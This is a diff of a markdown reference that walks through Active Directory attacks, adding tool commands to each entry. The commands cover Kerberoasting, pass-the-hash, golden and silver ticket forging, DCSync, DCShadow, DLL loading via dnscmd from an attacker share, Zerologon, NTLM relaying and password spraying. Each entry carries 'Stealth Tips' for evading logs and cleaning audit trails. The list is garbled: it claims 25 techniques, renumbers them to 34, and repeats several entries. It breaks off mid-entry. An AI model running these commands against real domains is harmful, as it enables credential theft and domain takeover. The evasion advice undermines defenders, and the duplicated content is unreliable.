@@ -94,813 +94,1047 @@ This document provides a detailed walkthrough of **25 real-world Active Director
 - **Purpose**: Offline cracking of user password hash  
 - **Functionality**: Kerberos allows unauthenticated ticket requests for users with DONT_REQ_PREAUTH  
 - **Why It's Vulnerable**: No pre-auth required, so TGT encrypted with weak password hash can be cracked  
-- **How to Test**: Use GetNPUsers.py or Rubeus to extract hashes; crack using hashcat  
+- **How to Test**: Use `GetNPUsers.py` or `Rubeus` to extract AS-REP hashes  
+```bash
+# Using Impacket
+GetNPUsers.py -dc-ip 192.168.1.10 domain.local/ -usersfile users.txt
+
+# Using Rubeus
+Rubeus.exe asreproast
+```
 - **Tools**: Impacket, Rubeus, hashcat  
 - **Stealth Tips**: Use known usernames only; avoid brute-forcing; low log footprint  
-
 </details>
-
 
 <a name="kerberoasting"></a>
 <details>
   <summary><strong>2. Kerberoasting</strong></summary>
 
 - **Purpose**: Offline password cracking of service accounts  
-- **Functionality**: Any user can request a service ticket (TGS) for SPN accounts  
-- **Why It's Vulnerable**: Service ticket is encrypted with NTLM hash of the service account  
-- **How to Test**: Use Rubeus or GetUserSPNs.py to extract TGS and crack  
-- **Tools**: Rubeus, Impacket, hashcat  
-- **Stealth Tips**: Minimize TGS requests; monitor Event ID 4769  
+- **Functionality**: Any domain user can request service tickets for SPNs  
+- **Why It's Vulnerable**: Tickets are encrypted with service account NTLM hash  
+- **How to Test**: Extract SPN tickets using `GetUserSPNs.py` or `Rubeus`  
+```bash
+# Using Impacket
+GetUserSPNs.py -request -dc-ip 192.168.1.10 domain.local/user:password
 
+# Using Rubeus
+Rubeus.exe kerberoast
+```
+- **Tools**: Impacket, Rubeus, hashcat  
+- **Stealth Tips**: Limit SPN requests; monitor for Event ID 4769  
 </details>
 
-
-<a name="pass-the-hash-%28pth%29"></a>
+<a name="pass-the-hash"></a>
 <details>
   <summary><strong>3. Pass-the-Hash (PtH)</strong></summary>
 
 - **Purpose**: Authenticate without knowing plaintext password  
-- **Functionality**: Windows allows authentication using NTLM hashes  
-- **Why It's Vulnerable**: Captured NTLM hashes can be reused in SMB/WinRM  
-- **How to Test**: Use evil-winrm or wmiexec with hash  
-- **Tools**: Mimikatz, Evil-WinRM, CrackMapExec  
-- **Stealth Tips**: Use non-noisy protocols (e.g., WinRM); avoid failed auth  
+- **Functionality**: Windows allows authentication using NTLM hash  
+- **Why It's Vulnerable**: Captured hashes can be reused for lateral movement  
+- **How to Test**: Use tools to authenticate with just the hash  
+```bash
+# SMB via wmiexec
+wmiexec.py domain.local/user@192.168.1.20 -hashes <NTLM>:<NTLM>
 
+# WinRM
+evil-winrm -i 192.168.1.20 -u user -H <NTLM>
+```
+- **Tools**: Mimikatz, Impacket, Evil-WinRM  
+- **Stealth Tips**: Use valid hashes only; avoid brute-force; monitor 4624 events  
 </details>
 
-
-<a name="pass-the-ticket-%28ptt%29"></a>
+<a name="pass-the-ticket"></a>
 <details>
   <summary><strong>4. Pass-the-Ticket (PtT)</strong></summary>
 
-- **Purpose**: Reuse Kerberos ticket for lateral movement  
-- **Functionality**: Kerberos TGTs and TGSs are valid for hours  
-- **Why It's Vulnerable**: Extracted tickets can be reused from other machines  
-- **How to Test**: Use Rubeus to inject TGT (.kirbi) into current session  
-- **Tools**: Rubeus, Mimikatz  
-- **Stealth Tips**: Use existing ticket times; avoid creating new tickets  
+- **Purpose**: Authenticate using forged or stolen Kerberos tickets  
+- **Functionality**: Windows lets users inject TGT/TGS tickets into session  
+- **Why It's Vulnerable**: Kerberos tickets can be reused or forged  
+- **How to Test**: Inject ticket using `Rubeus` or `Mimikatz`  
+```bash
+# Dump existing tickets
+Rubeus.exe dump
 
+# Inject ticket
+Rubeus.exe ptt /ticket:<base64>.kirbi
+
+# Or with Mimikatz
+kerberos::ptt ticket.kirbi
+```
+- **Tools**: Rubeus, Mimikatz  
+- **Stealth Tips**: Reuse only valid, short-lived tickets; monitor ticket injection  
 </details>
 
+<a name="overpass-the-hash"></a>
+<details>
+  <summary><strong>5. Overpass-the-Hash (Pass-the-Key)</strong></summary>
+
+- **Purpose**: Generate TGT using NTLM hash instead of password  
+- **Functionality**: NTLM hash used to request TGT via Kerberos  
+- **Why It's Vulnerable**: Weak NTLM protection enables fake TGT generation  
+- **How to Test**: Use `Rubeus` to request and inject TGT  
+```bash
+# Request TGT using NTLM
+Rubeus.exe asktgt /user:<user> /rc4:<NTLM> /domain:<domain.local>
+
+# Inject ticket
+Rubeus.exe ptt /ticket:<base64>.kirbi
+```
+- **Tools**: Rubeus, hashcat  
+- **Stealth Tips**: Avoid multiple TGT requests; clean up tickets post-use  
+</details>
+
+<a name="golden-ticket"></a>
+<details>
+  <summary><strong>6. Golden Ticket</strong></summary>
+
+- **Purpose**: Forge a TGT for any user with unlimited lifetime  
+- **Functionality**: Built using krbtgt NTLM hash  
+- **Why It's Vulnerable**: Compromise of `krbtgt` account enables full domain persistence  
+- **How to Test**: Use `Mimikatz` to forge and inject a TGT  
+```powershell
+# Mimikatz command
+kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:<hash> /ticket:golden.kirbi
+kerberos::ptt golden.kirbi
+```
+- **Tools**: Mimikatz  
+- **Stealth Tips**: Use only when krbtgt hash is available; monitor 4768/4769 logs  
+</details>
+
+<a name="silver-ticket"></a>
+<details>
+  <summary><strong>7. Silver Ticket</strong></summary>
+
+- **Purpose**: Forge TGS for specific service  
+- **Functionality**: Uses service account NTLM hash (not krbtgt)  
+- **Why It's Vulnerable**: No need to contact DC when using forged TGS  
+- **How to Test**: Forge and inject TGS using Mimikatz or Rubeus  
+```powershell
+# Forge silver ticket
+kerberos::golden /user:svcuser /domain:domain.local /sid:S-1-5-... /rc4:<NTLM> /service:cifs /target:hostname /ticket:silver.kirbi
+kerberos::ptt silver.kirbi
+```
+- **Tools**: Mimikatz, Rubeus  
+- **Stealth Tips**: No DC contact makes detection harder; cleanup injected TGS  
+</details>
 
 <a name="dcsync-attack"></a>
 <details>
-  <summary><strong>5. DCSync Attack</strong></summary>
+  <summary><strong>8. DCSync Attack</strong></summary>
 
-- **Purpose**: Dump password hashes from DC without LSASS access  
-- **Functionality**: Accounts with Replication rights can request user secrets  
-- **Why It's Vulnerable**: Rights like Replicating Directory Changes allow this access  
-- **How to Test**: Use Mimikatz lsadump::dcsync /user:Administrator  
-- **Tools**: Mimikatz, secretsdump.py  
-- **Stealth Tips**: Limit to 1 request; Event ID 4662 if auditing enabled  
+- **Purpose**: Extract password hashes directly from DC  
+- **Functionality**: Abuse `Replicating Directory Changes` rights to mimic a DC  
+- **Why It's Vulnerable**: Misconfigured ACLs grant replication rights  
+- **How to Test**: Use Mimikatz `lsadump::dcsync`  
+```powershell
+lsadump::dcsync /domain:domain.local /user:Administrator
+```
+- **Tools**: Mimikatz  
+- **Stealth Tips**: Generates log 4662; use on stealthy admin accounts  
+</details>
 
+<a name="dcshadow-attack"></a>
+<details>
+  <summary><strong>9. DCShadow Attack</strong></summary>
+
+- **Purpose**: Push malicious changes into AD (e.g., SIDHistory)  
+- **Functionality**: Register rogue domain controller and replicate changes  
+- **Why It's Vulnerable**: Abuse of replication permissions  
+- **How to Test**: Use `mimikatz` DCShadow module  
+```powershell
+# In mimikatz
+lsadump::dcshadow /object:CN=user,CN=Users,DC=domain,DC=local /attribute:Description /value:Hacked
+```
+- **Tools**: Mimikatz  
+- **Stealth Tips**: Hard to detect; monitor for rogue DC registrations  
+</details>
+
+<a name="shadow-credentials"></a>
+<details>
+  <summary><strong>10. Shadow Credentials</strong></summary>
+
+- **Purpose**: Persist access using alternate credentials (KeyCredential)  
+- **Functionality**: Add fake key to user object for silent authentication  
+- **Why It's Vulnerable**: Misconfigured ACLs allow adding `msDS-KeyCredentialLink`  
+- **How to Test**: Use `Whisker` or `pyWhisker`  
+```bash
+# Using pyWhisker
+python3 pywhisker.py --action add --target 'user@domain.local' --sid S-1-5-... --cert-pfx evil.pfx
+```
+- **Tools**: pyWhisker, Rubeus, adidnsdump  
+- **Stealth Tips**: Extremely stealthy; nearly no log footprint  
 </details>
 
 
 <a name="unconstrained-delegation"></a>
 <details>
-  <summary><strong>6. Unconstrained Delegation</strong></summary>
+  <summary><strong>11. Unconstrained Delegation</strong></summary>
 
-- **Purpose**: Steal TGTs from incoming users  
-- **Functionality**: Delegated systems cache TGTs of authenticating users in memory  
-- **Why It's Vulnerable**: Attacker can extract TGTs from memory if they control such a host  
-- **How to Test**: Dump LSASS on delegated host after privileged user login  
-- **Tools**: Procdump, Mimikatz, Rubeus  
-- **Stealth Tips**: Dump only after login; avoid repeated access  
+- **Purpose**: Impersonate any user who authenticates to a service  
+- **Functionality**: TGTs are stored in memory and can be stolen  
+- **Why It's Vulnerable**: Services with unconstrained delegation store user TGTs  
+- **How to Test**: Identify systems with unconstrained delegation  
+```powershell
+# PowerView
+Get-DomainComputer -Unconstrained
 
+# Extract TGT from memory using Rubeus
+Rubeus.exe dump
+```
+- **Tools**: PowerView, Rubeus, Mimikatz  
+- **Stealth Tips**: Avoid crashing LSASS; use on logged-in targets  
 </details>
-
 
 <a name="constrained-delegation"></a>
 <details>
-  <summary><strong>7. Constrained Delegation</strong></summary>
+  <summary><strong>12. Constrained Delegation</strong></summary>
 
-- **Purpose**: Impersonate users to a specific service  
-- **Functionality**: Service accounts can impersonate to target SPNs using user’s TGT  
-- **Why It's Vulnerable**: Abuse the delegation to impersonate DA to a specific service  
-- **How to Test**: Use S4U modules in Rubeus or Impacket to impersonate  
-- **Tools**: Rubeus, Impacket  
-- **Stealth Tips**: Limit usage; target non-logged services  
-
+- **Purpose**: Impersonate a user to a specific service  
+- **Functionality**: Service can request TGS on behalf of user  
+- **Why It's Vulnerable**: Misconfigured S4U2Self/S4U2Proxy allows impersonation  
+- **How to Test**: Abuse using S4U attack with Rubeus  
+```powershell
+# S4U attack using Rubeus
+Rubeus.exe s4u /user:<user> /rc4:<NTLM> /impersonateuser:Administrator /msdsspn:cifs/dc.domain.local /domain:<domain>
+```
+- **Tools**: Rubeus  
+- **Stealth Tips**: No DC contact if ticket reused; monitor 4769 logs  
 </details>
 
-
-<a name="resource-based-constrained-delegation-%28rbcd%29"></a>
+<a name="resource-based-constrained-delegation"></a>
 <details>
-  <summary><strong>8. Resource-Based Constrained Delegation (RBCD)</strong></summary>
+  <summary><strong>13. Resource-Based Constrained Delegation (RBCD)</strong></summary>
 
-- **Purpose**: Gain access to services by controlling delegation  
-- **Functionality**: AD allows specifying which accounts can delegate to a service  
-- **Why It's Vulnerable**: Create a machine account and assign it to RBCD of a target  
-- **How to Test**: Use PowerView or Set-ADComputer to set msDS-AllowedToActOnBehalfOfOtherIdentity  
-- **Tools**: Rubeus, PowerView, Impacket  
-- **Stealth Tips**: Prefer machine account reuse; avoid excessive LDAP changes  
+- **Purpose**: Impersonate users to target machine or service  
+- **Functionality**: Target object controls its own delegation settings  
+- **Why It's Vulnerable**: Any user with write access to target can configure delegation  
+- **How to Test**: Use `GenericWrite`/`GenericAll` to set msDS-AllowedToActOnBehalfOfOtherIdentity  
+```powershell
+# Using PowerView
+Set-ADComputer -Identity TARGET -PrincipalsAllowedToDelegateToAccount ATTACKER$
 
+# Using Rubeus and S4U
+Rubeus.exe s4u ...
+```
+- **Tools**: PowerView, Rubeus, SharpHound  
+- **Stealth Tips**: Clean up delegation entries post-exploitation  
 </details>
 
-
-<a name="silver-ticket"></a>
+<a name="printer-bug-coercion"></a>
 <details>
-  <summary><strong>9. Silver Ticket</strong></summary>
+  <summary><strong>14. Printer Bug (SpoolSample)</strong></summary>
 
-- **Purpose**: Access services without contacting DC  
-- **Functionality**: TGS can be forged using service account’s NTLM hash  
-- **Why It's Vulnerable**: Use hash to forge TGS with Mimikatz or Rubeus  
-- **How to Test**: Create TGS for service and inject it  
-- **Tools**: Mimikatz, Rubeus  
-- **Stealth Tips**: Avoid Kerberos event logs; direct access to service  
-
+- **Purpose**: Coerce authentication from remote machine  
+- **Functionality**: Exploit MS-RPRN to trigger SMB authentication  
+- **Why It's Vulnerable**: Misuse of Print Spooler to trigger outbound auth  
+- **How to Test**: Use `SpoolSample` or `rpcdump`  
+```bash
+# SpoolSample
+SpoolSample.exe <victim-ip> <attacker-ip>
+```
+- **Tools**: SpoolSample, Inveigh  
+- **Stealth Tips**: Use with relaying setup (e.g., ntlmrelayx)  
 </details>
 
+<a name="shadow-admins"></a>
+<details>
+  <summary><strong>15. Shadow Admins</strong></summary>
+
+- **Purpose**: Persistence via indirect privilege escalation  
+- **Functionality**: Users granted rights over admin accounts  
+- **Why It's Vulnerable**: Misconfigured ACLs allow privilege chaining  
+- **How to Test**: Identify users/groups with indirect control  
+```powershell
+# Using PowerView
+Invoke-ACLScanner | ? { $_.IdentityReference -like "*admin*" }
+```
+- **Tools**: PowerView, BloodHound  
+- **Stealth Tips**: Shadow paths harder to detect than DA membership  
+</details>
+
+<a name="admin-sdholder-abuse"></a>
+<details>
+  <summary><strong>16. AdminSDHolder Abuse</strong></summary>
+
+- **Purpose**: Persistent privilege escalation  
+- **Functionality**: Changes to AdminSDHolder propagate to protected accounts  
+- **Why It's Vulnerable**: Write access to AdminSDHolder object gives domain rights  
+- **How to Test**: Add user to AdminSDHolder's ACL  
+```powershell
+# Using PowerView
+Add-ADPermission -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -User attacker -ExtendedRights "All"
+```
+- **Tools**: PowerView, ADSI Edit  
+- **Stealth Tips**: Change re-applies every 60 minutes; remove afterward  
+</details>
+
+<a name="acl-based-privesc"></a>
+<details>
+  <summary><strong>17. ACL-Based PrivEsc</strong></summary>
+
+- **Purpose**: Escalate privileges using misconfigured object permissions  
+- **Functionality**: WriteDACL/GenericAll enables adding membership or privileges  
+- **Why It's Vulnerable**: Poor delegation of permissions  
+- **How to Test**: Identify writeable objects using BloodHound or PowerView  
+```powershell
+# With PowerView
+Invoke-ACLScanner
+
+# Add user to group
+Add-ADGroupMember -Identity "Domain Admins" -Members attacker
+```
+- **Tools**: PowerView, BloodHound  
+- **Stealth Tips**: Clean audit trails, remove attacker after use  
+</details>
+
+<a name="gmsa-abuse"></a>
+<details>
+  <summary><strong>18. gMSA Abuse</strong></summary>
+
+- **Purpose**: Abuse Group Managed Service Account to gain lateral access  
+- **Functionality**: Passwords for gMSAs are retrievable by authorized systems  
+- **Why It's Vulnerable**: Misconfigured read permissions allow extraction  
+- **How to Test**: Use Mimikatz or custom tools to extract gMSA password  
+```powershell
+# Using Mimikatz
+lsadump::gmsa
+```
+- **Tools**: Mimikatz, ADModule  
+- **Stealth Tips**: Very stealthy if done from authorized machine  
+</details>
+
+<a name="ldap-signing-downgrade"></a>
+<details>
+  <summary><strong>19. LDAP Signing Downgrade</strong></summary>
+
+- **Purpose**: Downgrade secure LDAP communication for interception  
+- **Functionality**: Disable signing requirements to perform MITM  
+- **Why It's Vulnerable**: Default configuration allows unsigned LDAP  
+- **How to Test**: Use `ntlmrelayx` with LDAP relaying  
+```bash
+# Relaying NTLM to LDAP
+ntlmrelayx.py -t ldap://dc.domain.local --escalate-user attacker
+```
+- **Tools**: Impacket, Responder, ntlmrelayx  
+- **Stealth Tips**: Combine with coercion attacks (e.g., PetitPotam)  
+</details>
+
+<a name="zerologon"></a>
+<details>
+  <summary><strong>20. Zerologon (CVE-2020-1472)</strong></summary>
+
+- **Purpose**: Full DC compromise via Netlogon flaw  
+- **Functionality**: Exploits all-zero challenge to bypass auth  
+- **Why It's Vulnerable**: Flawed cryptographic implementation in Netlogon  
+- **How to Test**: Use `Zerologon` PoC or `impacket` script  
+```bash
+# Test
+python3 zerologon_tester.py dc.domain.local
+
+# Exploit
+python3 zerologon_exploit.py dc.domain.local
+```
+- **Tools**: Impacket, CVE PoC  
+- **Stealth Tips**: Very noisy; avoid unless authorized  
+</details>
+
+<a name="dnsadmin-to-dc-compromise"></a>
+<details>
+  <summary><strong>21. DNSAdmin to DC Compromise</strong></summary>
+
+- **Purpose**: Elevate privileges to SYSTEM on a Domain Controller  
+- **Functionality**: DNSAdmin can load DLLs through `dnscmd`  
+- **Why It's Vulnerable**: DNS server service runs as SYSTEM and loads external DLLs  
+- **How to Test**: Load a malicious DLL via `dnscmd`  
+```bash
+dnscmd <dc> /config /serverlevelplugindll \attacker\share\malicious.dll
+# Restart DNS service
+sc \<dc> stop dns
+sc \<dc> start dns
+```
+- **Tools**: dnscmd, msfvenom, smbserver.py  
+- **Stealth Tips**: Clean up DLL path and logs after use  
+</details>
+
+<a name="password-spray"></a>
+<details>
+  <summary><strong>22. Password Spray</strong></summary>
+
+- **Purpose**: Identify weak passwords across many users  
+- **Functionality**: Attempts same password for multiple users to avoid lockout  
+- **Why It's Vulnerable**: AD doesn’t detect horizontal brute force effectively  
+- **How to Test**: Use CrackMapExec or Hydra  
+```bash
+crackmapexec smb <target> -u users.txt -p 'Password123'
+```
+- **Tools**: CrackMapExec, Hydra, Kerbrute  
+- **Stealth Tips**: Respect lockout policy; long wait between tries  
+</details>
+
+<a name="llmnr-nbt-ns-poisoning"></a>
+<details>
+  <summary><strong>23. LLMNR/NBT-NS Poisoning</strong></summary>
+
+- **Purpose**: Capture NetNTLMv2 hashes from network  
+- **Functionality**: Responds to broadcast name resolution requests  
+- **Why It's Vulnerable**: LLMNR/NBT-NS enabled by default  
+- **How to Test**: Run Responder on local subnet  
+```bash
+responder -I eth0
+```
+- **Tools**: Responder, Hashcat  
+- **Stealth Tips**: Only use when legitimate traffic exists  
+</details>
 
 <a name="golden-ticket"></a>
 <details>
-  <summary><strong>10. Golden Ticket</strong></summary>
+  <summary><strong>24. Golden Ticket</strong></summary>
 
-- **Purpose**: Forge TGT and impersonate any user  
-- **Functionality**: If KRBTGT hash is known, you can forge valid TGTs  
-- **Why It's Vulnerable**: Use Mimikatz to forge TGT with domain SID and KRBTGT hash  
-- **How to Test**: Inject ticket into session and access DC  
+- **Purpose**: Create forged TGTs to impersonate any user  
+- **Functionality**: TGTs can be forged using KRBTGT hash  
+- **Why It's Vulnerable**: Domain compromise gives access to KRBTGT  
+- **How to Test**: Extract KRBTGT hash and forge TGT  
+```powershell
+# Mimikatz
+lsadump::lsa /patch
+kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21... /krbtgt:<hash>
+```
 - **Tools**: Mimikatz  
-- **Stealth Tips**: Limit validity; cleanup injected tickets  
-
+- **Stealth Tips**: Set realistic lifetime, timestamps; avoid reuse  
 </details>
 
-
-<a name="ntdsdit-dump"></a>
+<a name="silver-ticket"></a>
 <details>
-  <summary><strong>11. NTDS.dit Dump</strong></summary>
+  <summary><strong>25. Silver Ticket</strong></summary>
 
-- **Purpose**: Extract all AD user hashes  
-- **Functionality**: NTDS.dit stores all password hashes for domain  
-- **Why It's Vulnerable**: Access DC and dump NTDS.dit and SYSTEM hive  
-- **How to Test**: Use secretsdump.py or DSInternals to parse  
-- **Tools**: ntdsutil, secretsdump.py, DSInternals  
-- **Stealth Tips**: Use VSS to avoid detection  
-
+- **Purpose**: Access services without contacting DC  
+- **Functionality**: TGS can be forged using service account’s NTLM hash  
+- **Why It's Vulnerable**: TGS validation does not require DC communication  
+- **How to Test**: Use hash to forge TGS with Mimikatz or Rubeus  
+```powershell
+# Mimikatz
+kerberos::ptt ticket.kirbi
+```
+- **Tools**: Mimikatz, Rubeus  
+- **Stealth Tips**: Avoid Kerberos event logs; direct access to service  
 </details>
 
-
-<a name="gpp-passwords"></a>
+<a name="privileged-session-hijack"></a>
 <details>
-  <summary><strong>12. GPP Passwords</strong></summary>
+  <summary><strong>26. Privileged Session Hijack</strong></summary>
 
-- **Purpose**: Recover local admin creds from SYSVOL  
-- **Functionality**: Legacy Group Policy XML files stored with encrypted passwords  
-- **Why It's Vulnerable**: Locate Groups.xml and decrypt cpassword value  
-- **How to Test**: Search SYSVOL for GPP files, use gpp-decrypt  
-- **Tools**: GPPDecrypt, SharpGPP  
-- **Stealth Tips**: Read-only operation; no log generation  
-
+- **Purpose**: Steal or reuse high-privilege token/session  
+- **Functionality**: Session tokens in memory can be reused  
+- **Why It's Vulnerable**: High-privilege sessions often left active  
+- **How to Test**: Enumerate and steal token using Mimikatz  
+```powershell
+# Mimikatz
+token::list
+token::elevate
+```
+- **Tools**: Mimikatz  
+- **Stealth Tips**: Avoid alerting interactive users  
 </details>
 
-
-<a name="laps-dumping"></a>
+<a name="kerberos-unconstrained-delegation-ticket-theft"></a>
 <details>
-  <summary><strong>13. LAPS Dumping</strong></summary>
+  <summary><strong>27. Kerberos Unconstrained Delegation Ticket Theft</strong></summary>
 
-- **Purpose**: Retrieve LAPS-managed local passwords  
-- **Functionality**: Passwords stored in AD attribute ms-MCS-AdmPwd  
-- **Why It's Vulnerable**: Query the attribute using a user with read rights  
-- **How to Test**: Get-ADComputer -Property ms-MCS-AdmPwd  
-- **Tools**: PowerView, SharpLAPS  
-- **Stealth Tips**: Check permissions before; no change needed  
-
+- **Purpose**: Steal TGTs from systems with delegation enabled  
+- **Functionality**: Attacker can extract TGT from memory after victim login  
+- **Why It's Vulnerable**: Unconstrained delegation caches TGT in memory  
+- **How to Test**: Wait for login, extract TGT  
+```powershell
+# Rubeus
+Rubeus.exe dump
+```
+- **Tools**: Rubeus, Mimikatz  
+- **Stealth Tips**: Passive collection; avoid causing logon  
 </details>
 
-
-<a name="adminsdholder-abuse"></a>
+<a name="kerberos-over-pass-the-ticket"></a>
 <details>
-  <summary><strong>14. AdminSDHolder Abuse</strong></summary>
+  <summary><strong>28. Kerberos Over Pass-the-Ticket (PtT)</strong></summary>
 
-- **Purpose**: Persistent admin privilege via ACLs  
-- **Functionality**: ACLs on AdminSDHolder apply to all protected users  
-- **Why It's Vulnerable**: Modify AdminSDHolder DACL to grant access to attacker  
-- **How to Test**: Use PowerView to modify ACLs  
-- **Tools**: PowerView, ADACLScanner  
-- **Stealth Tips**: Delay abuse to maintenance windows  
-
+- **Purpose**: Use forged TGT/TGS to authenticate  
+- **Functionality**: Inject Kerberos ticket into current session  
+- **Why It's Vulnerable**: No validation of origin of ticket  
+- **How to Test**: Inject valid TGT  
+```powershell
+# Rubeus or Mimikatz
+kerberos::ptt ticket.kirbi
+```
+- **Tools**: Mimikatz, Rubeus  
+- **Stealth Tips**: Use short lifetime; remove ticket after use  
 </details>
 
-
-<a name="acl-abuse"></a>
+<a name="kerberos-rc4-ticket-renewal"></a>
 <details>
-  <summary><strong>15. ACL Abuse</strong></summary>
+  <summary><strong>29. Kerberos RC4 Ticket Renewal</strong></summary>
 
-- **Purpose**: Escalate privileges using misconfigured permissions  
-- **Functionality**: GenericWrite, WriteOwner etc. on high-priv objects  
-- **Why It's Vulnerable**: Identify and exploit access rights  
-- **How to Test**: Use BloodHound to identify privilege escalation paths  
-- **Tools**: BloodHound, PowerView  
-- **Stealth Tips**: Exploit only one path at a time  
-
+- **Purpose**: Extend lifetime of Kerberos tickets  
+- **Functionality**: Re-request new ticket using valid one  
+- **Why It's Vulnerable**: Reuse of hash for encryption allows forging  
+- **How to Test**: Use RC4 key with Rubeus  
+```powershell
+# Rubeus
+Rubeus.exe renew /ticket:<kirbi>
+```
+- **Tools**: Rubeus  
+- **Stealth Tips**: Limit renewals; use realistic renewal times  
 </details>
 
-
-<a name="printer-spooler-bug"></a>
+<a name="delegation-chaining"></a>
 <details>
-  <summary><strong>16. Printer Spooler Bug</strong></summary>
+  <summary><strong>30. Delegation Chaining</strong></summary>
 
-- **Purpose**: Force authentication to attacker host  
-- **Functionality**: Spooler service allows remote connections and auth triggers  
-- **Why It's Vulnerable**: Trigger authentication using SpoolSample or PrinterBug  
-- **How to Test**: Redirect auth to NTLM relay listener  
-- **Tools**: PrinterBug, Responder, Impacket  
-- **Stealth Tips**: Disable after use; triggers events  
-
+- **Purpose**: Pivot through multiple delegation relationships  
+- **Functionality**: Abuse chained constrained delegation  
+- **Why It's Vulnerable**: Hard to audit complex chains  
+- **How to Test**: Enumerate delegation paths using BloodHound  
+```bash
+# BloodHound
+Collect data → Analyze delegation edges
+```
+- **Tools**: BloodHound, Rubeus  
+- **Stealth Tips**: Use with known chains only; avoid failed impersonation  
 </details>
 
+
+<a name="kerberos-resource-based-constrained-delegation-rbcd"></a>
+<details>
+  <summary><strong>31. Resource-Based Constrained Delegation (RBCD)</strong></summary>
+
+- **Purpose**: Elevate privileges by controlling another computer’s delegation rights  
+- **Functionality**: Modify msDS-AllowedToActOnBehalfOfOtherIdentity attribute  
+- **Why It's Vulnerable**: Computers can be delegated rights to impersonate users  
+- **How to Test**: Create a computer account, set RBCD on target, and impersonate  
+```powershell
+# Powermad
+New-MachineAccount -MachineAccount "owned$" -Password "Password123!"
+Set-ADComputer 'TARGET' -PrincipalsAllowedToDelegateToAccount 'owned$'
+```
+- **Tools**: Powermad, Rubeus, mimikatz  
+- **Stealth Tips**: Avoid AD logs; use short-lived account  
+</details>
 
 <a name="shadow-credentials"></a>
 <details>
-  <summary><strong>17. Shadow Credentials</strong></summary>
+  <summary><strong>32. Shadow Credentials</strong></summary>
 
-- **Purpose**: Persist via malicious certificate mapping  
-- **Functionality**: UserCertificates attribute can store arbitrary certs  
-- **Why It's Vulnerable**: Inject malicious cert, then use it for impersonation  
-- **How to Test**: Use Whisker or Certipy to inject and authenticate  
-- **Tools**: Certipy, Whisker  
-- **Stealth Tips**: Remove cert after use  
-
+- **Purpose**: Persist access by planting alternate credentials  
+- **Functionality**: Abuse msDS-KeyCredentialLink attribute  
+- **Why It's Vulnerable**: Weak ACLs allow editing sensitive attributes  
+- **How to Test**: Inject certificate or key credential  
+```powershell
+# Whisker or pyWhisker
+pywhisker add -u targetuser -d domain -k c:\cert.pfx
+```
+- **Tools**: pyWhisker, Certify  
+- **Stealth Tips**: Avoid changing primary credentials; clean up afterward  
 </details>
 
-
-<a name="certificate-template-escalation-%28esc1%29"></a>
+<a name="acl-based-privilege-escalation"></a>
 <details>
-  <summary><strong>18. Certificate Template Escalation (ESC1)</strong></summary>
+  <summary><strong>33. ACL-Based Privilege Escalation</strong></summary>
 
-- **Purpose**: Enroll as admin via misconfigured template  
-- **Functionality**: Weak ACLs on template allow unauthorized enrollment  
-- **Why It's Vulnerable**: Request certificate with higher privilege permissions  
-- **How to Test**: Use Certify or Certipy to list and exploit templates  
-- **Tools**: Certify, Certipy  
-- **Stealth Tips**: Use short-lived certs, cleanup enrollment  
-
+- **Purpose**: Abuse weak ACLs to gain privileges  
+- **Functionality**: Modify rights on sensitive objects (e.g., user, computer)  
+- **Why It's Vulnerable**: Delegation often misconfigured  
+- **How to Test**: Enumerate ACLs using BloodHound  
+```bash
+# SharpHound/BloodHound
+Collect ACL data → Analyze Effective Permissions
+```
+- **Tools**: BloodHound, PowerView, ADACLScanner  
+- **Stealth Tips**: Use inherited ACLs stealthily; revert after use  
 </details>
 
-
-<a name="service-unquoted-path-abuse"></a>
+<a name="dcsync"></a>
 <details>
-  <summary><strong>19. Service Unquoted Path Abuse</strong></summary>
+  <summary><strong>34. DCSync Attack</strong></summary>
 
-- **Purpose**: Privilege escalation to SYSTEM  
-- **Functionality**: Windows services with unquoted paths allow writing malicious exe  
-- **Why It's Vulnerable**: Replace exe in writable path and restart service  
-- **How to Test**: Use sc qc and accesschk to verify permissions  
-- **Tools**: accesschk, sc.exe  
-- **Stealth Tips**: Time replacement during service downtime  
-
-</details>
-
-
-<a name="rdp-hijack"></a>
-<details>
-  <summary><strong>20. RDP Hijack</strong></summary>
-
-- **Purpose**: Intercept RDP session of DA  
-- **Functionality**: Logged-in sessions can be hijacked via TS API  
-- **Why It's Vulnerable**: Detect active RDP session and take over  
-- **How to Test**: Use tscon.exe to connect to existing session  
-- **Tools**: tscon.exe  
-- **Stealth Tips**: Only works locally; use with caution  
-
-</details>
-
-
-<a name="sam-%26-system-hive-dump"></a>
-<details>
-  <summary><strong>21. SAM & SYSTEM Hive Dump</strong></summary>
-
-- **Purpose**: Dump local hashes from registry  
-- **Functionality**: SAM & SYSTEM registry hives store local account credentials  
-- **Why It's Vulnerable**: Export hives and parse offline  
-- **How to Test**: Use reg.exe or Volume Shadow Copy  
-- **Tools**: reg.exe, secretsdump.py  
-- **Stealth Tips**: Use shadow copy to avoid lock issues  
-
-</details>
-
-
-<a name="lsa-secrets-dump"></a>
-<details>
-  <summary><strong>22. LSA Secrets Dump</strong></summary>
-
-- **Purpose**: Retrieve stored service creds  
-- **Functionality**: LSA stores secrets like service passwords and cached creds  
-- **Why It's Vulnerable**: Dump registry and parse using tools  
-- **How to Test**: Export HKLM\SECURITY and SYSTEM  
-- **Tools**: secretsdump.py, mimikatz  
-- **Stealth Tips**: Requires SYSTEM; avoid writing to disk  
-
-</details>
-
-
-<a name="rid-cycling"></a>
-<details>
-  <summary><strong>23. RID Cycling</strong></summary>
-
-- **Purpose**: Enumerate users by RID brute-force  
-- **Functionality**: SAMR protocol allows RID lookup  
-- **Why It's Vulnerable**: Cycle RIDs from 500–1500 to find valid users  
-- **How to Test**: Use rpcclient or crackmapexec  
-- **Tools**: rpcclient, CME  
-- **Stealth Tips**: Limit RID range; avoid excessive RPC calls  
-
-</details>
-
-
-<a name="token-impersonation"></a>
-<details>
-  <summary><strong>24. Token Impersonation</strong></summary>
-
-- **Purpose**: Steal tokens from other sessions  
-- **Functionality**: Access tokens can be duplicated from running processes  
-- **Why It's Vulnerable**: Enumerate and impersonate tokens via Mimikatz  
-- **How to Test**: token::list and token::elevate  
+- **Purpose**: Dump password hashes for any domain user  
+- **Functionality**: Mimics domain controller behavior to replicate secrets  
+- **Why It's Vulnerable**: User with Replication rights can pull hashes  
+- **How to Test**: Use Mimikatz with DCSync  
+```powershell
+# Mimikatz
+lsadump::dcsync /domain:domain.local /user:krbtgt
+```
